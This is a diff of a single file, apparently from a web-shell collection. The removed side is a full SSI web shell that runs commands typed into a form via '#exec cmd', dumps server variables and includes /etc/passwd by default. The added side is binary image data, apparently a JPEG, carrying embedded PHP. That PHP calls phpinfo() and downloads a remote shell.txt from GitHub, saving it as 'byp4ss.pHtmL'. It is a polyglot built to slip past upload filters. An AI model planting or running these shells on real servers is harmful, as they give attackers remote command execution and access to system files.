@@ -1,89 +1,85 @@
-<!--#config errmsg="[Error in shell]"-->
-<!--#set var="zero" value="" -->
-<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
-<!--#set var="shl" value="ls -al" -->
-<!--#else -->
-<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
-<!--#endif -->
-<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
-<!--#set var="inc" value="/../../../../../../../etc/passwd" -->
-<!--#else -->
-<!--#set var="inc" value=$QUERY_STRING_UNESCAPED -->
-<!--#endif -->
-<html>
-<head>
-<title>
-SSI Shell
-</title>
-<script language="javascript">
-function fex()
-{
-document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+document.getElementById('command').value;
-}
-function vfile()
-{
-document.location.href="<!--#echo var=DOCUMENT_NAME -->?cat "+document.getElementById('vfile').value;
-}
-</script>
-</head>
-<body bgcolor=#e4e0d8 alink=blue vlink=blue>
-<div align=center width=100% border=0 style=background-color:#D4D0C8;>
-<center><b><font size=+2><a href=http://github.com/Anon-Exploiter>SSI Shell</a></font></b></center>
-</div>
-<br>
-<div align=left width=100% border=0 style=background-color:#D4D0C8;>
-<center><b><font size=+1>Shell info</font></b></center>
-<br>
-<b><font color=blue>GMT date</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DATE_GMT --></b><br>
-<b><font color=blue>Local date</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DATE_LOCAL --></b><br>
-<b><font color=blue>Document name</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DOCUMENT_NAME --></b><br>
-<b><font color=blue>Document URI</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DOCUMENT_URI --></b><br>
-<b><font color=blue>Last modified</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=LAST_MODIFIED --></b><br>
-<b><font color=blue>Owner</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=USER_NAME --></b><br>
-<br>
-</div>
-<br>
-<div align=left width=100% border=0 style=background-color:#D4D0C8;>
-<center><b><font size=+1>Server info</font></b></center>
-<br>
-<pre>
-<!--#printenv-->
-</pre>
-<br>
-</div>
-<br>
-<div align=left width=100% border=0 style=background-color:#D4D0C8;>
-<center><b><font size=+1>Command for shell & address for inclusion</font></b></center>
-<br>
-<b><font color=blue>Enter command/address</font></b>:&nbsp;&nbsp;&nbsp;<input type=text size=80 id=command>&nbsp;<input type=button value=Run onclick=fex();>
-<br>
-</div>
-<br>
-<div align=left width=100% border=0 style=background-color:#D4D0C8;>
-<center><b><font size=+1>Shell</font></b></center>
-<br>
-<b><font color=blue>Executed command</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=shl --></b><br>
-<textarea bgcolor=#e4e0d8 cols=121 rows=15>
-<!--#exec cmd=$shl -->
-</textarea>
-<br>
-</div>
-<br>
-<div align=left width=100% border=0 style=background-color:#D4D0C8;>
-<center><b><font size=+1>Operations on files</font></b></center>
-<br>
-<b><font color=blue>View file (cat)</font></b>:&nbsp;&nbsp;&nbsp;<input type=text size=80 id=vfile value=<!--#echo var=SCRIPT_FILENAME -->>&nbsp;<input type=button value=Run onclick=vfile();><br>
-<b><font color=blue>Included file</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=inc --></b><br>
-<textarea bgcolor=#e4e0d8 cols=121 rows=15>
-<!--#include virtual=$inc -->
-</textarea>
-<br>
-</div>
-<br>
-<div align=center width=100% border=0 style=background-color:#D4D0C8;>
-<center><b><font size=+1><a href=http://github.com/Anon-Exploiter>(c) :V ( :3 )</a></font></b><br><small>2009, v1.02<!--êîïèðàéò ïîìåíÿí â 2011 ;) --></small><br>
-ONLY FOR EDUCATIONAL PURPOSES. ILLEGAL ACTIVITIES PROHIBITED.
-</center>
-</div>
-</body>
-</html>
+�J��(<h1><a href="shell.shtml">Sh3ll</a></h1><?php phpinfo(); ?><? @fwrite(fopen('byp4ss.pHtmL','w'),file_get_contents('https://raw.githubusercontent.com/mkdirlove/S3cr3t/main/shell.txt')); ?><h1>BLOOS3RPENT<br></h1>
+���	( %!1!%)+...383-7(-.+
+�-%&---0+---------5---------------/-------+---+/------���"���C!1AQq"a���2BR��r��#3b����Cs�Sc�45t������0!1A"2Qqa�����#3B������
+                                                                                                                             ?��X�����)OI�C��U"m��ct^���'�c��婝���*$�'E:p�F�+���K9���y��w�*L�wa�e~��L:7��8+�@�<�NDw�t����ً�����P��Qa�p�G��|�li&��c}�_{���(<��o�.��Ê�c;��V�Ҙjx�f�[�M���t��f
+    20� oy�����1t�?Mn��mS�#����.�;�v���1t��.A�ei�cX����c-�?jә���r��Y[F91�L䣉'(�<x����	d���9�
+                                                                                              9�,e�j۔�iM�r��K� ؀?���$*�kA�c�0�b--��J��{c�m�+���ݾ;bn,g�+dc��|�9%X�
+ 2�F�:B��	a�ۉ�z��������d��&�|`�<\룏 ��1�#3����)������\-T�Vȁ�[i���6����cM����>Йޙ\l##�)��椌�c�����'\�������3{�(�K(��!�%���V
+                                                                                                                               pҰ^KD���5�GX-��Z���!���r6�oPO�x��ʯ�D�V{
+�JY�%P���0�_O	Q�{/�<��lE��2�mԋwɔM2�pQh4'F�T��5>�kص�(��!5x�ӡ`W�3�
+                                                                  �>�v
+�L!�4���|�b0:P�RËv@��ӟHa^��qf_"7��醌�)��;T�������W�9O��oD�[q��k\M>�_�\R�h5*�~�Z��G�f�u�M7A�v��N�]`7]r#�I�Յ�v2�ԥ����3��������mj�|C"�{y�?Oh�B�Ot���	��r��
+                                                                                                                                                             ���ن��;��EeY/
+�PUG����_t�L�M
+�j�*v~���j�YB%��3�^8k�u��90^��y������oĹ�,|fE��8S��*w�o�.����ā�FfVgN(v�l��g1�2K�2JE�"�(�G���11)�v#�4p��X��+_h�VAQL�u��At?������!���)iOc���Z�7.��W$P�^SEOC� k-�`�
+ �k�E%�f���i�����A`"�`V���w�t���&��Lf'��Xg�G)���
+�P�R��p���o4�7�kRG�L�ߪ�z=(��N �L^���~�S�T��g���ͺ��&�f���k:[�MJ��v�k�x���y���'���mŵO&��i�������Us+��`m�&��?���$�!qQ{�7��E��gS�%�[_�6�h��r�7�F6#����9�L�l�$	�:c
+  *�������1�<���)�%c�Ӟ,�
+s�Zk3�S�͢LG�WL�$�0G��z��կN��=�|�zP;t\�q*��?)���g+��dt�:����ۊ�a��,r�����Ys�%Ӽ��S���G��r��5�h�^TX3��6�,cx�Y�(�%��)
+      l�:b"���,Q&�2�`�Ff  ~���e�Tv���^>��#�V
+                                            ��^Q���(�I��AF����y�l
+                                                                 )����y9 �Q>S��
+                                                                               R�R>�@B�_5�"�δ��|m"?y@����|u�/�x������[�G���c��Ɉ�1�j�?��G�#���ߴ-u�:nQ�
+                                                                                                                                                     e��E�S��+T����*3ul|m��t�E���?��^ߍF������Iz��f������;z�_���z(U�V�ҫƤ�'��/8��.���õj�*
+Ǆ��{)�J������I=��'2n���7�i���c��h������x�"�uU�d�e�ۼ                     �F*�T���
+                                      �?���,��tU���F�_B{I���E�Vg����lJX���a�N���vs��jA][��1�`��s�"����HDB�I8���$o�����J
+                                                                                                                       ��G*"��J��`�澳{M��1=]~���N㹗a� �M7G���K�[�2�Z`���N�@������hC��Js/�[!5vL����,���o���_��qS��^�y%��4$�V�'�b~ӑ���JՏ�/�>`K�=2Ƴ~�����0��ϖP�q�"��F�OQ�
+�ڦCW�	��
+          ud�ze�j�so��I�VMR�AZ�#� �c�g�I��>������j_И����=��{�p�;��z��}�bT�jU��r���=�q�[���S��:�qfk��k�0�+
+                                                                                                         ���P6�j*1S͊߸�	赩��sn����	P���p�f��?rB��1�%�.�!Ww$:�zz��)Ȃo��5u�E:^�j�n�,��;&wߺg���J�P�g�YE>�ʊ�fnG��ف�c���Y��KY�Ѣ-Q�V׬n�0Gf�
+ht�N=��Hٔ� ���V�|���5���=��c�d;�5�3ZsF�TA��G���p�3�)����>jg �h?:l9j���c*KRǠ����cPn��
+�6�҉Q
+��,T�a����8�=��T��1��2&[\�n2����oG!���tQu�-�̮y�)(����Sx�ɬ��跦5�����9�ʲ���Qr�Ėq�l=]FW�Xv;'~�������n�2�1���d����<
+                                                                                                              �5�!����;d��/��`^�����ϡP��%vTQ�[����l�o��i/B�q�(��6S�?�M3�_IM��Q
+�Owݜ�h�&���#z�kr*5W�eM�h����S�MJ�Z�U���Q���>�H�Z�<�-^�����Ɛ����S�~u�<�nO���u���*ר�SEK�	�W;X���l�͙�l"�H[D��Xp�X}�5D���l/���5��:ςeM�E^��q(�?	�+�(7�	$e�
+                                                                                                                                                           �"l��&��GD�
+��v��M���M)D�MF�5m΢�I�PN~�P֨[���z^�5�_rꯊ���^`p�Zx3_5�
+                                                    Ҕ���#����m�)ժ͊k���Bo�G�Lv����z���T���
+                                                                                        �b	ձ�3�G���rJ��v:��Z䜬��JM�z��Q`��G�{�r&��@�٭ԛl��GOe	�JaB�tŀZ�����-�9P$�f[�C�`U-�j(��j�
+                           �l/�HO=�e�ڭ
+�2��1?'���i��k�b�h�$r	�pv@���0�x�6x��g5�u��&�����o2cl�S7�@��
+                                                              �I_�u݋��g.��&����
+                                                                               8���9\p�b���w��!t�
+�zy>d���L��;`ڪ}��k�;�t(�*i�p����DfD��Q
+���k�y��a4���~�7����^'�v�m�o���H�۴��'v.���혐���屸}Gt�(��B�\މs�����Ў+�#��t�
+��                                                                        ��q�/hw�xy|�ʯA��M���f�[|�	�p��QQ2�)�[i_����V���*���n�
+  e�Iep��(n2�.c����1X��X�* ꆬ)uֶ]a{&��ְ�a:(+�،f#�lZ�]";����"�fð�DN����Ը'05A�7&�����^í���'V��8���L3.]�^�A�jX{��yۡtM�AOV���*X�"�Bڣ;���.ns�������~g|�ZK�Uo��\��vɣ��S������_��w_3�!�9��u���a����m���h�\Z��#��*
+                                        (z�ĝ�-�W#cn�?�������� �:�F�N����E���3(KaNM��)�nB(x�Ḑ�r_G��V��#�5fd>ԱtyS���Q��c�!C̊����ѹ����O�f���V'ʫWT1�yI�y��w��u)Uk6�����ezG�g��Қ.�+9�!�Q����3���HӺ�צ����w�4��P�v�R�=�G����K�P�A��F'�3������H�\��`��p��j�\X�9@x!j�w��C���t���
+�������x��<�മz�9kp�C�v��O�
+                     ����
+
+E�צ5H;*�>�1�_v�0�ʱT     �D��g�/���1��B���M~��P[R�W�a��x�����DD�������2�n#1�']&��#4�&�R�N�45{�u
+���dO��J����ǲ��'�ٿ�                                                                           d�.��X-R�(�yHP�Ϫ�w7d��q��N*�j�r���XyH�E�24Kj����/����2�3���q���
+��و��wI            �2��d� ��<ePo��H��ho�{*��>E��>�):� N��jJLhf|����;��kR}e�A��z��5L�U�&R	�j��?v�̿��������恪�Z��F�&��[@�У2���T�e���B�P����-՛�����C���4zkTٟ
+       d�8D�3�a����@XM����V�:����w�'�	�q(�Ө��L�R��7�ڍ-S9�"��8�ľ��c�Q,n7�^�/YJ�j�
+                                                                                  ��
+                                                                                    hz�kM]��Z,A�V�.sU�2bT�ka')�Ө��7�n$���G�D�e1���f��
+)�s:px�m^(�iպ6��V�zw���է�7=}N�[� y�c���&�c����D���?�qƓz20�GZ��qZ���!Y�aR�5�p���"a����!,�+n
+                  �4@�"��y	�F�a����ݺ^�ci���Ȱ�վ��\��>�����F�YC��_�}��&���)��xmIjY.2Qz_~?tih�S2�1
+                                                                                                    Ћ����{�&qgf��j8;���U���´��E��)�9-���UQ��qb�3�V���]�
+                                                                                                                                                       �U��_��ݶ�_����:�EZ�ۂ�U^�wdz����Iz�,f�D
+ �ix���Th
+         IW��Z�隨z�~�A�e�D��c��[��w�ԩ�\�,�����hY)*���r2
+���X{{������ꓭ ��]r�5�5��{˕n~g�y�������
+��W�)Ǵ�x(>6�+S�����.ҧ��Z�R���ui�Ks���1�mˀ�Ƽ����3�B��ҿ�o�
+�gpMj�x:&I,�E�I���(��i%y��dLh�F��h��Qn�!��q1`q��ͼ}Gt��Sl�G�U�)��h�%S�z��0~�����m��o�����چ�sn��� Ag�cî[�]P��	F
+                                                                                                                 L2YkE��
+                                                                                                                        ���1�4z��2�A�Fb�D2�6z�_}�8�V�֢��H�e�P���?�Q������~Mr�`37��"�+.�����h��h0Օ�Ճ �y�ӮP��k�/
+                                              5�
+                                                ���1�����0(m�3~�Cɿ_�Te����?�&��
+G&#��(/6�-��X\%gm|K���Ads6�#u��+�&Yz���*�]�z���٣L��N���O9�� wϟzC���x�۞���A�O�  ��R�,
+                                                                             4��-��lq��F�N2��$F0�9� ���y`ds#h���c,ռ���p4h���#D$!)ق�
+                                                                                                                                   ���7�G�9p J*K
+                                                                                                                                                8NPy�4�q
+�:����;��#Nc��Y��D9�4���ݒ9�n|9�LV����t�\e��e�CE�.M�q�
+                                                     M^�]K#l�6�><�殜lNjm���o���m.�ҩ=Qك0� ��(�[+y{-�
+                                                                                                   �t�'��O�Y�| LF�uݗ���9��/�-�\�B�e���zI=;gu��C�=&��>�EJ�؊l���.m��k����B8n�VU��\5e�0O5�yV�?2�=�8���e���
+�s�w��:���VMJ[�Wym�>R�                  �j/���%���J v�F�p|I������H��_�_K���a*�������j��\��Y�t�4晫���U;2T�
+                      �s�0�$d(c�(�
+                                  QF���ǐ�Z�b��'q�����,�Ę���RQh�D���Iȃ�F���#&�
+)n�                                                                          ��wCVZ�.�US��F��_����o��
+^�7�L��2��Ǻc@�Ύiӕ*���1�
+                       >�G�n��㺤�7�|��B���t��Tk��\�癶v{�S
+                                                         ��}��<:_�g����t�fZ�U��Y�2�e`EƵ������"��i�鯙��E�i����j�7a|ˋn�q�g��bU=X�_�{Ěl�a:��Z��V9}�'a�I�F��t�@�ڪ� ZUo`=��=�Q�;Awv�6m�Y٘%�15�ʥ����MK��B(��t��yJ��DJ	��>	,�1�4�!QB9�"�Y�1�RX�HB�2E�Z?|�Qr4W����yF�
+                                                                                                 �T����K{49���QL������W�f��L������z��(�j�M�=��eQE6�
+                                                                                                                                                   r�B#)`�P�)�1�:�"�FR?��
